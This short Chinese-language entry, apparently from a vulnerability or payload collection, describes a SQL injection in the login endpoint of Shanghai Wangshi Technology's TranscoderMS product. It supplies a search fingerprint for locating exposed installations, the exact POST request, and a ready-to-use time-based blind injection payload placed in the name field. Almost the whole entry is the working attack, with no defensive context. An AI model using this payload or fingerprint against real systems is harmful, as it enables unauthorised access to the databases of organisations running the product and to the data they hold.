# 上海网仕科技TranscoderMSindex存在SQL注入漏洞

上海网仕科技 ｜ SQL注入 ｜ —
- **指纹**：`"webtrans//js/md5-min.js"`
- **请求**：`POST /webtrans/index.php?controller=user&action=login HTTP/1.1`

**Payload**
```
name=test111;') AND (SELECT 1 FROM (SELECT(SLEEP(5)))xSEI) AND ('aFKS'='aFKS&pass=MTExMTExMTExMTExMTExMTExMTExMTExMTEx&lang=zh_CN
```
- **响应特征**：200